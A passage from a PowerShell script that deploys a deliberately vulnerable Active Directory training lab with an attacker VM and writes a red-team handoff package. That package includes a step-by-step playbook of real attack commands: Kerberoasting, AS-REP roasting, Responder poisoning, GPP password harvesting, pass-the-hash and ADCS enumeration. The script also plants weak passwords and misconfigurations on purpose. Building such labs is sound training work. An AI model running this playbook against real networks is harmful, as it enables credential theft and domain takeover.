Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
LABINFO

    echo "[+] Attacker VM provisioning complete!"
  SHELL
end
"@

    Set-Content -Path (Join-Path $attackerDir "Vagrantfile") -Value $vagrantContent -Force
    Write-Log "Attacker VM Vagrantfile generated." "SUCCESS"

    # Provision attacker VM
    Push-Location $attackerDir
    try {
        $vagrantStatus = & vagrant status 2>&1
        if ($vagrantStatus -match "running") {
            if (-not $Force) {
                Write-Log "Attacker VM already running." "WARN"
                return
            }
            & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
        }

        Write-Log "Starting Attacker VM (this will take 10-15 minutes)..."
        & vagrant up 2>&1 | ForEach-Object { Write-Log $_ }
        if ($LASTEXITCODE -ne 0) {
            Write-Log "Attacker VM provisioning had warnings (exit code: $LASTEXITCODE)" "WARN"
        }
        else {
            Write-Log "Attacker VM provisioned successfully!" "SUCCESS"
        }
    }
    finally {
        Pop-Location
    }
}

# ─── SNAPSHOTS ───────────────────────────────────────────────────────────────────

function New-VMwareSnapshots {
    param([string]$Timestamp)
    Write-Banner "CREATING VMWARE SNAPSHOTS"

    if (-not $script:VMRUN) {
        Write-Log "vmrun not available — skipping snapshots." "WARN"
        return
    }

    $snapshotName = "Fresh-Deploy-$Timestamp"

    # Find all running VMs
    $runningVMs = & $script:VMRUN list 2>&1
    $vmxFiles = $runningVMs | Where-Object { $_ -match "\.vmx$" }

    if (-not $vmxFiles) {
        Write-Log "No running VMs found for snapshotting." "WARN"
        return
    }

    foreach ($vmx in $vmxFiles) {
        $vmName = [System.IO.Path]::GetFileNameWithoutExtension($vmx)
        Write-Log "Snapshotting $vmName -> $snapshotName"
        & $script:VMRUN snapshot "$vmx" "$snapshotName" 2>&1 | ForEach-Object { Write-Log $_ }
        if ($LASTEXITCODE -eq 0) {
            Write-Log "Snapshot created: $vmName" "SUCCESS"
        }
        else {
            Write-Log "Snapshot failed for $vmName" "WARN"
        }
    }
}

# ─── HANDOFF PACKAGE GENERATION ──────────────────────────────────────────────────

function New-HandoffPackage {
    param(
        [hashtable]$Config,
        [hashtable]$NetInfo,
        [string]$VMnet,
        [array]$ADUsers,
        [array]$ServiceAccounts,
        [array]$Misconfigs,
        [string]$Timestamp
    )
    Write-Banner "GENERATING RED TEAM HANDOFF PACKAGE"

    $domainClean = $Config.domain -replace "\.", "-"
    $handoffDir = Join-Path $SCRIPT_DIR "RedTeam-Handoff-${domainClean}-${Timestamp}"
    New-Item -ItemType Directory -Path $handoffDir -Force | Out-Null

    $domainParts = $Config.domain -split "\."
    $domainNetbios = $domainParts[0].ToUpper()
    $dcIP1 = "$($NetInfo.Subnet).10"
    $dcIP2 = "$($NetInfo.Subnet).11"
    $srvIP  = "$($NetInfo.Subnet).22"
    $attackerIP = $NetInfo.Attacker

    # ── Handoff.md ──
    $handoffMd = @"
# RED TEAM ENGAGEMENT — ASSUMED BREACH HANDOFF

**Classification: CONFIDENTIAL — Authorized Personnel Only**
**Client: $($Config.clientName)**
**Date: $(Get-Date -Format 'MMMM dd, yyyy')**
**Engagement ID: RT-$(Get-Date -Format 'yyyyMMdd')-$(Get-Random -Minimum 1000 -Maximum 9999)**

---

## 1. ENGAGEMENT OVERVIEW

$($Config.clientName) has engaged your team to conduct an **internal assumed-breach penetration test** of our Active Directory environment. This document provides the necessary information to begin testing.

**Type:** Internal Network Penetration Test — Assumed Breach
**Methodology:** PTES / MITRE ATT&CK
**Duration:** 5 business days (Mon–Fri, 09:00–17:00 local)
**Authorization:** Full authorization for testing within defined scope

## 2. RULES OF ENGAGEMENT

- **In-Scope:** All systems within the defined CIDR range(s)
- **Out-of-Scope:** Internet-facing assets, production databases (destructive operations)
- **Restrictions:**
  - No denial-of-service attacks
  - No physical access testing
  - No social engineering (unless separately authorized)
  - Stop and notify if PHI/PII is discovered (do not exfiltrate)
- **Emergency Contact:** IT Security Team — security@$($Config.domain -replace '\.local|\.internal|\.corp|\.lan|\.ad', '.com')
- **Phone:** +1 (555) $(Get-Random -Minimum 100 -Maximum 999)-$(Get-Random -Minimum 1000 -Maximum 9999)

## 3. SCOPE

### Network Ranges
| CIDR | Description |
|------|-------------|
| $($Config.cidr) | Primary corporate LAN — AD, servers, workstations |

### Domain Information
| Field | Value |
|-------|-------|
| **Domain** | $($Config.domain) |
| **NetBIOS** | $domainNetbios |
| **Domain Controllers** | DC01 ($dcIP1), DC02 ($dcIP2) |
| **Functional Level** | Windows Server 2019 |

## 4. ASSUMED BREACH — INITIAL ACCESS

You have been provided a **low-privileged domain account** simulating a compromised employee credential (e.g., phishing, credential stuffing, or an insider threat scenario).

| Field | Value |
|-------|-------|
| **Username** | ``$domainNetbios\$($Config.lowPrivUser.username)`` |
| **Password** | ``$($Config.lowPrivUser.password)`` |
| **Account Type** | Standard domain user |
| **Description** | Regular employee account with default group memberships |

> **Objective:** Escalate from this low-privileged account to **Domain Admin** or equivalent enterprise admin access. Document the full attack path.

## 5. KNOWN NETWORK INFORMATION

The following has been shared as part of the assumed-breach scenario (simulating information an insider or compromised workstation would have access to):

- File shares are accessible at ``\\$dcIP1\`` and ``\\$srvIP\``
- The IT department uses a shared ``\\$srvIP\IT-Share$`` for scripts and tools
- DNS is served by the domain controllers
- WSUS is hosted internally (potential for lateral movement)
- Several legacy service accounts are known to exist

## 6. POINTS OF CONTACT

| Role | Name | Contact |
|------|------|---------|
| **Engagement Lead** | [Your Name] | engagement-lead@client.com |
| **IT Security** | Security Operations | security@$($Config.domain -replace '\.local|\.internal|\.corp|\.lan|\.ad', '.com') |
| **Emergency** | CISO Office | +1 (555) $(Get-Random -Minimum 100 -Maximum 999)-$(Get-Random -Minimum 1000 -Maximum 9999) |

## 7. DELIVERABLE EXPECTATIONS

- Executive Summary
- Technical Findings (CVSS-scored)
- Full Attack Narrative with screenshots
- Remediation Recommendations
- BloodHound data / attack path diagrams

---

*This document is the property of $($Config.clientName) and is provided under NDA.*
"@
    Set-Content -Path (Join-Path $handoffDir "Handoff.md") -Value $handoffMd -Force

    # ── lab-credentials.txt ──
    $credLines = @"
================================================================================
  INSTA-INTERNAL-LABINATOR — LAB CREDENTIALS
  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
  Domain: $($Config.domain) ($domainNetbios)
================================================================================

DOMAIN CONTROLLERS
──────────────────
  DC01: $dcIP1   (Administrator / vagrant)
  DC02: $dcIP2   (Administrator / vagrant)

SERVER(S)
─────────
  SRV02: $srvIP  (Administrator / vagrant)

INITIAL LOW-PRIV ACCOUNT (Assumed Breach)
─────────────────────────────────────────
  Username: $domainNetbios\$($Config.lowPrivUser.username)
  Password: $($Config.lowPrivUser.password)

ATTACKER VM
───────────
  IP: $attackerIP
  SSH: ssh vagrant@$attackerIP (password: vagrant)

KERBEROASTABLE SERVICE ACCOUNTS
────────────────────────────────
"@
    foreach ($svc in $ServiceAccounts) {
        $credLines += "  $($svc.Name) / $($svc.Password)  (SPN: $($svc.SPN))`n"
    }

    $credLines += @"

WEAK PASSWORD ACCOUNTS (Subset — $(@($ADUsers | Where-Object { $_.WeakPW }).Count) of $($ADUsers.Count) total)
──────────────────────────
"@
    $weakUsers = $ADUsers | Where-Object { $_.WeakPW } | Select-Object -First 25
    foreach ($u in $weakUsers) {
        $credLines += "  $($u.Username) / $($u.Password)  ($($u.Department))`n"
    }
    $credLines += "`n  ... and $(@($ADUsers | Where-Object { $_.WeakPW }).Count - [Math]::Min(25, @($ADUsers | Where-Object { $_.WeakPW }).Count)) more weak passwords in the domain.`n"

    $credLines += @"

ACTIVE MISCONFIGURATIONS
────────────────────────
"@
    foreach ($mc in $Misconfigs) {
        $credLines += "  [x] $($mc.Id) — $($mc.Description)`n"
    }

    Set-Content -Path (Join-Path $handoffDir "lab-credentials.txt") -Value $credLines -Force

    # ── network-map.txt ──
    $networkMap = @"
================================================================================
  NETWORK MAP — $($Config.clientName) Lab Environment
  CIDR: $($Config.cidr)   |   VMnet: $VMnet   |   Domain: $($Config.domain)
================================================================================

                        ┌──────────────────────────┐
                        │     INTERNET / NAT       │
                        │    (VMware NAT Adapter)   │
                        └────────────┬─────────────┘
                                     │
                                     │ eth0 (NAT)
                        ┌────────────┴─────────────┐
                        │      ATTACKER VM         │
                        │   Ubuntu 24.04 LTS       │
                        │   IP: $attackerIP       │
                        │   Tools: Impacket, nmap  │
                        │   Docker + C2 Beacon     │
                        └────────────┬─────────────┘
                                     │ eth1 (Host-Only)
                                     │
          ═══════════════════════════════════════════════════
          ║           HOST-ONLY NETWORK ($VMnet)           ║
          ║              $($Config.cidr.PadRight(20))                  ║
          ═══════════════════════════════════════════════════
              │                   │                   │
    ┌─────────┴────────┐ ┌───────┴────────┐ ┌────────┴───────┐
    │      DC01        │ │      DC02      │ │     SRV02      │
    │ Win Server 2019  │ │ Win Server 2019│ │ Win Server 2019│
    │ IP: $($dcIP1.PadRight(14))│ │ IP: $($dcIP2.PadRight(12))│ │ IP: $($srvIP.PadRight(13))│
    │ Roles:           │ │ Roles:         │ │ Roles:         │
    │  - AD DS (PDC)   │ │  - AD DS (BDC) │ │  - File Server │
    │  - DNS           │ │  - DNS         │ │  - MSSQL       │
    │  - ADCS          │ │  - Replication │ │  - IIS         │
    └──────────────────┘ └────────────────┘ └────────────────┘

  LEGEND:
    PDC = Primary Domain Controller    BDC = Backup Domain Controller
    ADCS = AD Certificate Services     MSSQL = SQL Server
"@
    Set-Content -Path (Join-Path $handoffDir "network-map.txt") -Value $networkMap -Force

    # ── attacker-vm-access.md ──
    $attackerAccess = @"
# Attacker VM Access Guide

## SSH Access

``````bash
ssh vagrant@$attackerIP
# Password: vagrant
``````

## C2 Container

$(if ($Config.c2DockerImage) {
@"
The C2 beacon container is automatically deployed and running:

``````bash
# Check C2 status
cd /opt/c2
docker compose ps

# View C2 logs
docker compose logs -f

# Restart C2
docker compose restart

# Stop C2
docker compose down

# Start C2
docker compose up -d
``````

**C2 Image:** ``$($Config.c2DockerImage)``
"@
} else {
@"
No C2 Docker image was specified in the config. To deploy one manually:

``````bash
ssh vagrant@$attackerIP
mkdir -p /opt/c2
cd /opt/c2
# Create your docker-compose.yml and .env files
docker compose up -d
``````
"@
})

## Engagement Workspace

A workspace directory is pre-created at:
``````
/home/vagrant/engagement/
├── scans/       # nmap, masscan output
├── loot/        # captured hashes, tickets, creds
├── notes/       # engagement notes
└── bloodhound/  # BloodHound data collection
``````

## Installed Tools

| Tool | Location | Purpose |
|------|----------|---------|
| Impacket | /opt/impacket | AD attack suite |
| Responder | /opt/Responder | LLMNR/NBT-NS poisoning |
| enum4linux-ng | /opt/enum4linux-ng | SMB/AD enumeration |
| Kerbrute | /usr/local/bin/kerbrute | Kerberos user enum & brute |
| NetExec | pip install | CrackMapExec successor |
| BloodHound | apt install | AD attack path mapping |
| Certipy | pip install | ADCS exploitation |
| nmap | apt install | Network scanning |
| CrackMapExec | apt install | Network pentesting |
"@
    Set-Content -Path (Join-Path $handoffDir "attacker-vm-access.md") -Value $attackerAccess -Force

    # ── start-attacking.md ──
    $startAttacking = @"
# Start Attacking — Quick Reference

## Phase 0: Initial Reconnaissance

``````bash
# SSH into attacker VM
ssh vagrant@$attackerIP

# Verify network connectivity
ping -c 3 $dcIP1

# Quick port scan of the subnet
nmap -sn $($Config.cidr) -oA engagement/scans/pingsweep

# Full scan of discovered hosts
nmap -sC -sV -O $dcIP1 $dcIP2 $srvIP -oA engagement/scans/full-scan
``````

## Phase 1: Domain Enumeration (with low-priv creds)

``````bash
# Enumerate domain with CrackMapExec / NetExec
netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --shares
netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --users
netexec smb $($NetInfo.Subnet).0/24 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' --pass-pol

# LDAP enumeration
ldapsearch -x -H ldap://$dcIP1 -D "$($Config.lowPrivUser.username)@$($Config.domain)" -w '$($Config.lowPrivUser.password)' -b "DC=$($domainParts -join ',DC=')" "(objectClass=user)" samAccountName

# enum4linux
cd /opt/enum4linux-ng
python3 enum4linux-ng.py -A -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' $dcIP1
``````

## Phase 2: BloodHound Collection

``````bash
# Collect BloodHound data
bloodhound-python -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' \
  -d $($Config.domain) -ns $dcIP1 -c all \
  --zip -o engagement/bloodhound/

# Start neo4j and BloodHound UI (if GUI available)
sudo neo4j start
# Upload the ZIP to BloodHound
``````

## Phase 3: Kerberos Attacks

``````bash
# AS-REP Roasting
impacket-GetNPUsers $($Config.domain)/ -usersfile engagement/users.txt \
  -dc-ip $dcIP1 -format hashcat -outputfile engagement/loot/asrep-hashes.txt

# Kerberoasting
impacket-GetUserSPNs $($Config.domain)/$($Config.lowPrivUser.username):'$($Config.lowPrivUser.password)' \
  -dc-ip $dcIP1 -request -outputfile engagement/loot/kerberoast-hashes.txt

# Crack with hashcat (on your host)
# hashcat -m 18200 asrep-hashes.txt wordlist.txt
# hashcat -m 13100 kerberoast-hashes.txt wordlist.txt
``````

## Phase 4: SMB & Share Enumeration

``````bash
# Enumerate accessible shares
smbclient -L //$dcIP1 -U '$domainNetbios\$($Config.lowPrivUser.username)%$($Config.lowPrivUser.password)'

# Spider shares for sensitive files
netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' \
  -M spider_plus -o OUTPUT=engagement/loot/shares/

# Check for GPP passwords
netexec smb $dcIP1 -u '$($Config.lowPrivUser.username)' -p '$($Config.lowPrivUser.password)' -M gpp_password
``````

## Phase 5: Lateral Movement & Privilege Escalation

``````bash
# Check for LLMNR/NBT-NS poisoning (run Responder)
cd /opt/Responder
sudo python3 Responder.py -I eth1 -wrFd

# Pass-the-Hash (once you have hashes)
# impacket-psexec $domainNetbios/Administrator@$dcIP1 -hashes :NTHASH

# ADCS exploitation (if ESC1/ESC8 present)
certipy find -u '$($Config.lowPrivUser.username)@$($Config.domain)' -p '$($Config.lowPrivUser.password)' -dc-ip $dcIP1
``````

## Tips

- Always log everything: ``script engagement/notes/session-\$(date +%Y%m%d).log``
- Take screenshots of every finding
- Use ``tmux`` for persistent sessions
- Domain: **$($Config.domain)** | User: **$($Config.lowPrivUser.username)** | DC: **$dcIP1**
"@
    Set-Content -Path (Join-Path $handoffDir "start-attacking.md") -Value $startAttacking -Force

    # ── Full user list export ──
    $allUsersCSV = "Username,Password,FirstName,LastName,Department,Title,WeakPassword`n"
    foreach ($u in $ADUsers) {
        $allUsersCSV += "$($u.Username),$($u.Password),$($u.FirstName),$($u.LastName),$($u.Department),$($u.Title),$($u.WeakPW)`n"
    }
    Set-Content -Path (Join-Path $handoffDir "all-users.csv") -Value $allUsersCSV -Force

    Write-Log "Handoff package created: $handoffDir" "SUCCESS"
    return $handoffDir
}

# ─── DESTROY LAB ─────────────────────────────────────────────────────────────────

function Remove-Lab {
    Write-Banner "DESTROYING LAB ENVIRONMENT"

    # Destroy attacker VM
    $attackerDir = Join-Path $SCRIPT_DIR "attacker-vm"
    if (Test-Path $attackerDir) {
        Write-Log "Destroying Attacker VM..."
        Push-Location $attackerDir
        & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
        Pop-Location
        Write-Log "Attacker VM destroyed." "SUCCESS"
    }

    # Destroy GOAD VMs
    if (Test-Path $GOAD_DIR) {
        $providerDirs = @(
            (Join-Path $GOAD_DIR "ad" "GOAD-Light" "providers" "vmware"),
            (Join-Path $GOAD_DIR "ad" "GOAD-Light" "providers" "virtualbox"),
            (Join-Path $GOAD_DIR "ad" "GOAD" "providers" "vmware"),
            (Join-Path $GOAD_DIR "ad" "MINILAB" "providers" "vmware")
        )
        foreach ($pd in $providerDirs) {
            if (Test-Path $pd) {
                Write-Log "Destroying GOAD VMs in $pd..."
                Push-Location $pd
                & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
                Pop-Location
            }
        }
        Write-Log "GOAD VMs destroyed." "SUCCESS"
    }

    Write-Log "Lab environment destroyed." "SUCCESS"
    Write-Log "Handoff packages and logs preserved. Delete manually if needed." "INFO"
}

# ─── CONSOLE SUMMARY ─────────────────────────────────────────────────────────────

function Show-Summary {
    param(
        [hashtable]$Config,
        [hashtable]$NetInfo,
        [string]$VMnet,
        [string]$HandoffDir,
        [array]$ADUsers,
        [array]$ServiceAccounts,
        [array]$Misconfigs,
        [string]$Timestamp
    )

    $domainParts = $Config.domain -split "\."
    $domainNetbios = $domainParts[0].ToUpper()

    Write-Host ""
    Write-Host ("=" * 80) -ForegroundColor Green
    Write-Host ""
    Write-Host "  ██╗███╗   ██╗███████╗████████╗ █████╗       ██╗███╗   ██╗████████╗" -ForegroundColor Red
    Write-Host "  ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗      ██║████╗  ██║╚══██╔══╝" -ForegroundColor Red
    Write-Host "  ██║██╔██╗ ██║███████╗   ██║   ███████║█████╗██║██╔██╗ ██║   ██║   " -ForegroundColor Red
    Write-Host "  ██║██║╚██╗██║╚════██║   ██║   ██╔══██║╚════╝██║██║╚██╗██║   ██║   " -ForegroundColor Red
    Write-Host "  ██║██║ ╚████║███████║   ██║   ██║  ██║      ██║██║ ╚████║   ██║   " -ForegroundColor Red
    Write-Host "  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝      ╚═╝╚═╝  ╚═══╝   ╚═╝   " -ForegroundColor Red
    Write-Host "  ██╗      █████╗ ██████╗ ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ " -ForegroundColor Yellow
    Write-Host "  ██║     ██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗" -ForegroundColor Yellow
    Write-Host "  ██║     ███████║██████╔╝██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝" -ForegroundColor Yellow
    Write-Host "  ██║     ██╔══██║██╔══██╗██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗" -ForegroundColor Yellow
    Write-Host "  ███████╗██║  ██║██████╔╝██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║" -ForegroundColor Yellow
    Write-Host "  ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝" -ForegroundColor Yellow
    Write-Host ""
    Write-Host ("=" * 80) -ForegroundColor Green
    Write-Host ""
    Write-Host "  ENGAGEMENT SUMMARY" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  Client:          $($Config.clientName)" -ForegroundColor White
    Write-Host "  Domain:          $($Config.domain) ($domainNetbios)" -ForegroundColor White
    Write-Host "  Network:         $($Config.cidr) on $VMnet" -ForegroundColor White
    Write-Host "  Lab Variant:     $($Config.labVariant)" -ForegroundColor White
    Write-Host ""
    Write-Host "  INITIAL ACCESS (Assumed Breach)" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  Username:        $domainNetbios\$($Config.lowPrivUser.username)" -ForegroundColor Yellow
    Write-Host "  Password:        $($Config.lowPrivUser.password)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  INFRASTRUCTURE" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  DC01:            $($NetInfo.Subnet).10" -ForegroundColor White
    Write-Host "  DC02:            $($NetInfo.Subnet).11" -ForegroundColor White
    Write-Host "  SRV02:           $($NetInfo.Subnet).22" -ForegroundColor White
    Write-Host "  Attacker VM:     $($NetInfo.Attacker)" -ForegroundColor White
    Write-Host ""
    Write-Host "  DOMAIN STATISTICS" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  Total Users:     $($ADUsers.Count)" -ForegroundColor White
    Write-Host "  Weak Passwords:  $(@($ADUsers | Where-Object { $_.WeakPW }).Count) ($([math]::Round(@($ADUsers | Where-Object { $_.WeakPW }).Count / $ADUsers.Count * 100))%)" -ForegroundColor Red
    Write-Host "  Service Accts:   $($ServiceAccounts.Count) (Kerberoastable)" -ForegroundColor Red
    Write-Host "  Misconfigs:      $($Misconfigs.Count) active" -ForegroundColor Red
    Write-Host ""
    Write-Host "  HANDOFF PACKAGE" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  Location:        $HandoffDir" -ForegroundColor Green
    Write-Host ""
    Write-Host "  QUICK START" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  ssh vagrant@$($NetInfo.Attacker)  (password: vagrant)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  DESTROY LAB" -ForegroundColor Cyan
    Write-Host "  ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  .\Deploy-RedTeamLab.ps1 -Destroy" -ForegroundColor Yellow
    Write-Host ""
    Write-Host ("=" * 80) -ForegroundColor Green
    Write-Host ""
}

# ─── MAIN EXECUTION ──────────────────────────────────────────────────────────────

function Main {
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"

    Initialize-Logging

    Write-Banner "INSTA-INTERNAL-LABINATOR v$SCRIPT_VERSION"
    Write-Log "Starting deployment at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Log "Script directory: $SCRIPT_DIR"

    # Handle destroy mode
    if ($Destroy) {
        Remove-Lab
        return
    }

    # Step 1: Prerequisites
    Test-Prerequisites

    # Step 2: Load / generate config
    Write-Banner "LOADING ENGAGEMENT CONFIGURATION"
    $config = Read-ClientConfig -Path $ConfigPath
    Write-Log "Client: $($config.clientName)" "SUCCESS"
    Write-Log "Domain: $($config.domain)" "SUCCESS"
    Write-Log "CIDR:   $($config.cidr)" "SUCCESS"
    Write-Log "User:   $($config.lowPrivUser.username)" "SUCCESS"
    Write-Log "Lab:    $($config.labVariant)" "SUCCESS"

    # Step 3: Generate randomized AD data
    Write-Banner "GENERATING RANDOMIZED AD ENVIRONMENT"
    $adUsers = New-RandomADUsers
    Write-Log "Generated $($adUsers.Count) domain users ($(@($adUsers | Where-Object { $_.WeakPW }).Count) with weak passwords)"

    $svcAccounts = New-RandomServiceAccounts
    Write-Log "Generated $($svcAccounts.Count) Kerberoastable service accounts"

    $misconfigs = New-RandomMisconfigurations
    Write-Log "Activated $($misconfigs.Count) misconfigurations"

    # Step 4: Network setup
    $netInfo = Get-NetworkFromCIDR -CIDR $config.cidr
    $vmnet = Initialize-VMwareNetwork -NetInfo $netInfo -CIDR $config.cidr

    # Step 5: Deploy GOAD
    Deploy-GOAD -Config $config -NetInfo $netInfo -VMnet $vmnet `
                -ADUsers $adUsers -ServiceAccounts $svcAccounts -Misconfigs $misconfigs

    # Step 6: Deploy Attacker VM
    Deploy-AttackerVM -Config $config -NetInfo $netInfo -VMnet $vmnet

    # Step 7: Snapshots
    if (-not $SkipSnapshots) {
        New-VMwareSnapshots -Timestamp $timestamp
    }

    # Step 8: Generate handoff package
    $handoffDir = New-HandoffPackage -Config $config -NetInfo $netInfo -VMnet $vmnet `
                                      -ADUsers $adUsers -ServiceAccounts $svcAccounts `
                                      -Misconfigs $misconfigs -Timestamp $timestamp

    # Step 9: Summary
    Show-Summary -Config $config -NetInfo $netInfo -VMnet $vmnet `
                 -HandoffDir $handoffDir -ADUsers $adUsers `
                 -ServiceAccounts $svcAccounts -Misconfigs $misconfigs `
                 -Timestamp $timestamp

    Write-Log "Deployment complete! Check the handoff package at: $handoffDir" "SUCCESS"
    Write-Log "Log file: $LOG_FILE" "INFO"

    Stop-Transcript -ErrorAction SilentlyContinue
}

# Run
Main
